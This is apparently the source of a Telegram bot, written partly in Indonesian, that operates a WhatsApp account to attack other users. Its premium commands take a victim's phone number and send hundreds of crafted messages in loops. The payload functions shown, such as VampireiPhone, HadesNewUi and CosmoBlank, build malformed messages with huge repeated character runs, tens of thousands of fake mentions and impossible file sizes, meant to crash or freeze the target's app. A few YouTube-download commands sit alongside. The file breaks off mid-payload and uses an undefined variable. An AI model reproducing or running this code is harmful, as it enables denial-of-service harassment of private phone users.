bot.command("lineios", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];

  if (!q) {
    return await ctx.reply(`Example: /IsagiIphone 62×××`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await prosesrespone(target, ctx);

  try {
    await VampireiPhone(formatedNumber);

    await donerespone(target, ctx);
  } catch (error) {
    console.error(chalk.red.bold(`[!] Error in ios:`, error));
    await ctx.reply("❌ Terjadi error saat mengirim bug.");
  }
});
bot.command(
  "invisiphone",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /invisiphone 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    try {
      await VampireiPhone(formatedNumber);
      await VampireStuckLogo(formatedNumber);

      await donerespone(target, ctx);
    } catch (error) {
      console.error(chalk.red.bold(`[!] Error in ios:`, error));
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
    }
  }
);
bot.command(
  "blanktrash",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /IsagiIphone 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    try {
      await VampireStuckLogo(formatedNumber);
      await VampireSpecial(formatedNumber);

      await donerespone(target, ctx);
    } catch (error) {
      console.error(chalk.red.bold(`[!] Error in ios:`, error));
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
    }
  }
);
bot.command(
  "crashertrash",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /IsagiIphone 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    try {
      await VampireSpecial(formatedNumber);
      await VampCrashChat(formatedNumber);

      await donerespone(target, ctx);
    } catch (error) {
      console.error(chalk.red.bold(`[!] Error in ios:`, error));
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
    }
  }
);

bot.command(
  "IsagiIphone",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /IsagiIphone 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    try {
      for (let i = 0; i < 10; i++) {
        await NewIos(target, true);
        await NanCrashiPhone(target);
        await NanInvisIphone(target);
        await NanBlankIphone(target);
        await LockIPhone(target);

        console.log(
          chalk.green.bold(`[✓] Sent Bug Ios${i + 1}/10 to ${target}`)
        );
      }

      await donerespone(target, ctx);
    } catch (error) {
      console.error(chalk.red.bold(`[!] Error in ios:`, error));
      await ctx.reply("❌ Terjadi error saat mengirim bug.");
    }
  }
);

bot.command(
  "xprotocol",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /xprotocol 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 480; i++) {
      await protocolbug5(target, false);
      await protocolbug5(target, false);
      await protocolbug6(target, false);
      await protocolbug6(target, false);
      await protocolbug3(target, false);
      await protocolbug3(target, false);
      await protocolbug8(target, false);
      await protocolbug8(target, false);
    }

    await donerespone(target, ctx);
  }
);

bot.command(
  "delayhard",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /protocol 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 300; i++) {
     await protocolbug6(target, false);
     await frezbuttoninvis(target);
     await cursorinsix(target);
     await protocolbug3(target, false);
     await NewFuncDelay(target);
     await protocolbug8(target, false);
     await albummess(target);
    }

    await donerespone(target, ctx);
  }
);

bot.command(
  "xcombo",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /delaycombo 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 300; i++) {
     await protocolbug6(target, false);
     await frezbuttoninvis(target);
     await cursorinsix(target);
     await protocolbug3(target, false);
     await NewFuncDelay(target);
     await protocolbug8(target, false);
     await xatanicaldelayv2(target, false);
     await albummess(target);
     
    }

    await donerespone(target, ctx);
  }
);



bot.command(
  "XyFreeze",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /FreezeXdelay 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 300; i++) {
     await protocolbug6(target, false);
     await frezbuttoninvis(target);
     await cursorinsix(target);
     await protocolbug3(target, false);
     await NewFuncDelay(target);
    }

    await donerespone(target, ctx);
  }
);

bot.command(
  "multiscorpio",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /multiscorpio 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 300; i++) {
     await multiscorpio(target, false);
     await multiscorpio(target, false);
     await multiscorpio(target, false);
     await multiscorpio(target, false);
     await bulldozer1GB(target);
     await bulldozer1GB(target);
     await protocolbug6(target, false);
     await protocolbug6(target, false);
     await frezbuttoninvis(target);
     await frezbuttoninvis(target);
     await protocolbug3(target, false);
     await NewFuncDelay(target);
     await NewFuncDelay(target);
     await protocolbug8(target, false);
     await protocolbug8(target, false);
     await albummess(target);
     
    }

    await donerespone(target, ctx);
  }
);

bot.command(
  "bulldozer",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /bulldozer 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 300; i++) {
     await bulldozer1GB(target);
     await bulldozer1GB(target);
     await bulldozer1GB(target);
     await bulldozer1GB(target);
     await protocolbug6(target, false);
     await frezbuttoninvis(target);
     await cursorinsix(target);
     await protocolbug3(target, false);
     await NewFuncDelay(target);
     await protoxaudiov2(target, false);
     await location(target);
     await protocolbug8(target, false);
     await xatanicaldelayv2(target, false);
     await albummess(target);
    }

    await donerespone(target, ctx);
  }
);

bot.command(
  "delayinvis",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return await ctx.reply(`Example: /delayinvis 62×××`);
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 300; i++) {
     await protocolbug6(target, false);
     await protocolbug6(target, false);
     await protocolbug6(target, false);
     await protocolbug6(target, false);
     await frezbuttoninvis(target);
     await cursorinsix(target);
     await protocolbug3(target, false);
     await NewFuncDelay(target);
     await protoxaudiov2(target, false);
     await location(target);
     await protocolbug8(target, false);
     await protocolbug8(target, false);
     await protocolbug8(target, false);
     await protocolbug8(target, false);
     await xatanicaldelayv2(target, false);
     await StickerDelayx(target);
     await albummess(target);
    }

    await donerespone(target, ctx);
  }
);

bot.command(['play', 'youtubesearch'], async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply("Masukkan query parameters!");

    ctx.reply("🔍 Sedang mencari...");
    
    try {
        const anu = `https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(text)}`;
        const { data: response } = await axios.get(anu);
        
        const url = response.result.url;
        const caption = `🎵 Title: ${response.result.title}\n📜 Description: ${response.result.description}\n👀 Views: ${response.result.views}`;

        ctx.reply(caption, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🎵 Download MP3", callback_data: `ytmp3 ${url}` }],
                    [{ text: "📹 Download MP4", callback_data: `ytmp4 ${url}` }]
                ]
            }
        });
    } catch (e) {
        console.error(e);
        ctx.reply("❌ Terjadi kesalahan!");
    }
});

bot.command("ytmp4", async (ctx) => {
    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply("Masukkan URL video!");

    ctx.reply("📹 Mengunduh video...");
    
    try {
        const anu = `https://api.siputzx.my.id/api/d/ytmp4?url=${encodeURIComponent(text)}`;
        const { data: response } = await axios.get(anu);

        ctx.replyWithVideo({ url: response.data.dl }, { caption: "✅ Download selesai!" });
    } catch (e) {
        console.error(e);
        ctx.reply("❌ Gagal mengunduh video.");
    }
});

bot.action(/^ytmp3 (.+)$/, async (ctx) => {
    const url = ctx.match[1];
    ctx.reply(`🔊 Mengunduh MP3 dari ${url}...`);

    try {
        const anu = `https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(url)}`;
        const { data: response } = await axios.get(anu);

        ctx.replyWithAudio({ url: response.data.dl }, { caption: "✅ Download selesai!" });
    } catch (e) {
        console.error(e);
        ctx.reply("❌ Gagal mengunduh audio.");
    }
});

bot.action(/^ytmp4 (.+)$/, async (ctx) => {
    const url = ctx.match[1];
    ctx.reply(`📹 Mengunduh MP4 dari ${url}...`);

    try {
        const anu = `https://api.siputzx.my.id/api/d/ytmp4?url=${encodeURIComponent(url)}`;
        const { data: response } = await axios.get(anu);

        ctx.replyWithVideo({ url: response.data.dl }, { caption: "✅ Download selesai!" });
    } catch (e) {
        console.error(e);
        ctx.reply("❌ Gagal mengunduh video.");
    }
});

const photoUrls = [
  "https://telegra.ph/version-70-05-31",
  "https://telegra.ph/version-70-05-31",
];

function getRandomPhoto() {
  const randomkyyz = Math.floor(Math.random() * photoUrls.length);
  return photoUrls[randomkyyz];
}

function generateCaption(senderName, ctx) {
  return`
  \`\`\`𝗧𝗘𝗔𝗠
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ${senderName} 𝗧𝗛𝗘 𝗙𝗢𝗥𝗡𝗘𝗦
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを\`\`\`
╭━✧「 𝐒𝐢𝐗 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」
┃⬡ Developer : @Piwpiw011g
┃⬡ Bot Mode : Private
┃⬡ BotName : FORNES OS ANDROID
┃⬡ Version : 1.0
╰━━━━━━━━━━━━━━━━❍
⚡ 𝙎𝙃𝙊𝙒 𝘾𝙇𝙄𝘾𝙆 𝙏𝙃𝙀 𝘽𝙐𝙏𝙏𝙊𝙉
`;
}

function generateBugMenu(senderName) {
  return`
  \`\`\`𝗧𝗘𝗔𝗠
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ${senderName} 𝗧𝗛𝗘 𝗙𝗢𝗥𝗡𝗘𝗦
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを
╭━✧「 𝐒𝐢𝐗 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」
┃⬡ Developer : @Piwpiw011g
┃⬡ BotMode : Private
┃⬡ BotName : FORNES OS ANDROID
┃⬡ Version : 1.0
╰━━━━━━━━━━━━━━━━❍\`\`\`
╭━✧「 𝗡𝗢𝗧 𝗜𝗡𝗩𝗜𝗦𝗜𝗕𝗟𝗘 」
┃ ┏━━━❐
┃ ⧎ /delayhard 628xx
┃ ┗━━━━━━━━❏
╰══════════════❍
╭━✧「 𝗜𝗡𝗩𝗜𝗦𝗜𝗕𝗟𝗘 」
┃ ┏━━━━━❐
┃ ⧎ /delayinvis 628xx
┃ ⧎ /xprotocol 628xx
┃ ⧎ /xcombo 628xx
┃ ⧎ /bulldozer 628xx
┃ ⧎ /multiscorpio 628xx
┃ ┗━━━━━━━━━━❏
╰════════════════❍
`;
}

function generateOwnerMenu(senderName) {
  return `
  \`\`\`𝗧𝗘𝗔𝗠
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ${senderName} 𝗧𝗛𝗘 𝗙𝗢𝗥𝗡𝗘𝗦
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを
╭━✧「 𝐒𝐢𝐗 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」
┃⬡ Developer : @Piwpiw011g
┃⬡ BotMode : Private
┃⬡ BotName : FORNES OS ANDROID 
┃⬡ Version : 1.0
╰━━━━━━━━━━━━━━━━❍\`\`\`
╭━✧「𝐀͢𝐊͡𝐒𝐄͜⍣𝐒 Μ͢𝐄͡𝐍͢𝐔͡」
┃ ┏━━━━━━❏
┃ ⧎ /addpairing 628xx
┃ ⧎ /setjeda <detik>
┃ ⧎ /addowner <ɪᴅ>
┃ ⧎ /delowner <ɪᴅ>
┃ ⧎ /addadmin <ɪᴅ>
┃ ⧎ /deladmin <ɪᴅ>
┃ ⧎ /addprem <ɪᴅ>
┃ ⧎ /delprem <ɪᴅ>
┃ ⧎ /cekusersc <ᴘᴇɴɢɢᴜɴᴀ>
┃ ┗━━━━━━━━━━━━❏
╰═════════════════❍
`;
}

function generateTools(senderName) {
  return `
  \`\`\`𝗧𝗘𝗔𝗠
( 🍁 ) - 情報 𝗢𝗹𝗮𝗮 ${senderName} 𝗧𝗛𝗘 𝗙𝗢𝗥𝗡𝗘𝗦
─ 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 ─ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットは、速く柔軟で安全な自動化ツール。デジタルタスクを
╭━✱「 𝐒𝐢𝐗 ☇ 𝐂𝐨𝐫𝐞 ° 𝐒𝐲𝐬𝐭𝐞𝐦𝐬 」
┃⬡ Developer : @Piwpiw011g
┃⬡ BotMode : Private
┃⬡ BotName : FORNES OS ANDROID
┃⬡ Version : 1.0
╰━━━━━━━━━━━━━━━━❍\`\`\`
╭━✧「 Ͳ͢𝐎͡𝐎͢𝐋͡𝐒 」
┃┏━━━━━❏
┃⧎ /play
┃⧎ /tiktokmp3
┃⧎ /tiktokmp4
┃┗━━━━━━━━❏
╰════════════❍
`;
}

bot.start((ctx) => {
  const senderName = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id;
  const userId = ctx.from.id;
  const caption = generateCaption(senderName, ctx);

  ctx.telegram.sendPhoto(ctx.chat.id, "https://files.catbox.moe/871g9d.jpg", {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝐁͢𝐮͡𝐠⍣𝐌͜𝐞͢𝐧͡𝐮", callback_data: "bugmenu" },
          { text: "𝐀͢𝐊͡𝐒𝐄͜⍣𝐒 Μ͢𝐄͡𝐍͢𝐔͡", callback_data: "ownermenu" },
        ],
        [
          { text: "𝐓͢𝐨͡𝐨𝐥͜𝐬",
   callback_data: "tools" },
         ],
         [
          { text: "𝐃͡𝐄͢𝐕͡𝐄͢𝐋͡𝐎͢𝐏͡𝐄͢𝐑", url: "https://t.me/Piwpiw011g" },
          { text: "𝐈͡𝐍͢𝐅͡𝐎͢𝐑͡𝐌͢𝐀͡𝐓͢𝐈͡𝐎͢𝐍", url: "https://t.me/testiByBarzz" },
        ]
      ],
    },
  });
});
bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;
  const senderName = ctx.from.username ? `@${ctx.from.username}` : ctx.from.id;

  let newCaption = "";
  if (data === "bugmenu") newCaption = generateBugMenu(senderName);
  else if (data === "ownermenu") newCaption = generateOwnerMenu(senderName);
  else if (data === "tools")
  newCaption =
  generateTools(senderName);

  try {
    await ctx.editMessageCaption(newCaption, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝐁͢𝐮͡𝐠⍣𝐌͜𝐞͢𝐧͡𝐮", callback_data: "bugmenu" },
            { text: "𝐀͢𝐊͡𝐒𝐄͜⍣𝐒 Μ͢𝐄͡𝐍͢𝐔͡ ", callback_data: "ownermenu" },
          ],
          [
          { text: "𝐓͢𝐨͡𝐨𝐥͜𝐬",
   callback_data: "tools" },
          ],
          [
          { text: "𝐃͡𝐄͢𝐕͡𝐄͢𝐋͡𝐎͢𝐏͡𝐄͢𝐑", url: "https://t.me/Piwpiw011g" },
          { text: "𝐈͡𝐍͢𝐅͡𝐎͢𝐑͡𝐌͢𝐀͡𝐓͢𝐈͡𝐎͢𝐍", url: "https://t.me/testiByBarzz" },
        ]
      ]
    }
  });
  } catch (err) {
    console.error('Gagal edit caption:', err);
  }

  await ctx.answerCbQuery();
});

async function VampireiPhone(target) {
  try {
    await Dragon.relayMessage(
      target,
      {
        extendedTextMessage: {
          text: "〽️⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑〽️",
          contextInfo: {
            stanzaId: "1234567890ABCDEF",
            participant: target,
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [
                  {
                    jid: target,
                    callOutcome: "1",
                  },
                ],
              },
            },
            remoteJid: target,
            conversionSource: "source_example",
            conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
            conversionDelaySeconds: 10,
            forwardingScore: 9999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: "Example Advertiser",
              mediaType: "IMAGE",
              jpegThumbnail:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              caption: "This is an ad caption",
            },
            placeholderKey: {
              remoteJid: target,
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret:
              "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "ᐯᗩᗰᑭIᖇᗴ IOՏ̊‏‎",
              body: "ᐯᗩᗰᑭIᖇᗴ IOՏ‏‎",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewTtpe: "VIDEO",
              thumbnail:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "https://wa.me/settings",
              mediaUrl: "https://wa.me/settings",
              containsAutoReply: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example",
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://wa.me/settings",
            },
            groupSubject: "Example Group Subject",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: "trust_banner_example",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: "utm_source_example",
              utmCampaign: "utm_campaign_example",
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X ",
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net",
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true,
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

// Define venomModsData duluan, biar gak error saat dipakai di NewpayFc1
const venomModsData = JSON.stringify({
  status: true,
  criador: "VenomMods",
  resultado: {
    type: "md",
    ws: {
      _events: { "CB:ib,,dirty": ["Array"] },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true,
      },
    },
  },
});


async function HadesNewUi(target) {
  try {
    await Dragon.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "𝐖 𝐎 𝐋 𝐅 | 𝐗 𝐁 𝐋 𝐀 𝐍 𝐊 |  𝐔 𝐈🎭\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "hds",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function CosmoBlank(target, ptcp = true) {
  const Cosmo = `_*~@8~*_\n`.repeat(10500);
  const Nenen = 'ꦽ'.repeat(55555);

  await Dragon.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "Xnxx.com",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: 'W O L F X B L A N K ' + Nenen + Cosmo,
            },
            footer: {
              text: '',
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "Xnxx.com",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
